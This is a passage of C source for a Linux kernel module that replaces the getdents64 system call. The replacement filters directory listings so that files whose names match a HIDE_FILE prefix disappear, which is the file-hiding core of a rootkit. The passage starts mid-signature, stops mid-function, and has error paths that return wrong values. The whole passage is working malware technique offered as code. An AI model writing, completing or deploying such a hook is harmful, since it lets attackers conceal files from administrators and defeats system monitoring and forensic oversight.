                            struct linux_dirent64 *dirent,
                            unsigned int count)
{
    unsigned int ret, temp;
    int hide_file=0;
    int failed_copy;
    struct linux_dirent64 *dirp, *curr_dirp;

    /* call original function */
    ret = (*orig_getdents64) (fd, dirent, count);
    if (!ret)
        return ret;

    /* allocate memory at kernel */
    dirp = (struct linux_dirent64*) kmalloc(ret, GFP_KERNEL);
    if (!dirp)
        return dirp;

    /* copy from userspace to kernelspace */
    failed_copy = copy_from_user(dirp, dirent, ret);
    if (failed_copy !=0 )
        return failed_copy;

    curr_dirp = dirp;
    temp = ret;

    while (temp > 0) {
        /* d_reclen is a member of struct linux_dirent64, it's size of current linux_dirent64*/
        temp -= curr_dirp->d_reclen;
        hide_file = 1;

        if( (strncmp(curr_dirp->d_name, HIDE_FILE, strlen(HIDE_FILE)) == 0)) {
            /* not allow to display the file */
            ret -= curr_dirp->d_reclen;
            hide_file = 0;

            /* overlapping the current dirp */
            if (temp) 
                memmove(curr_dirp, (char*) curr_dirp + curr_dirp->d_reclen, temp);
        }

        /* search for the next linux_dirent64 */
        if (temp && hide_file)
            curr_dirp = (struct linux_dirent64*) ((char *) curr_dirp + curr_dirp->d_reclen);
    }
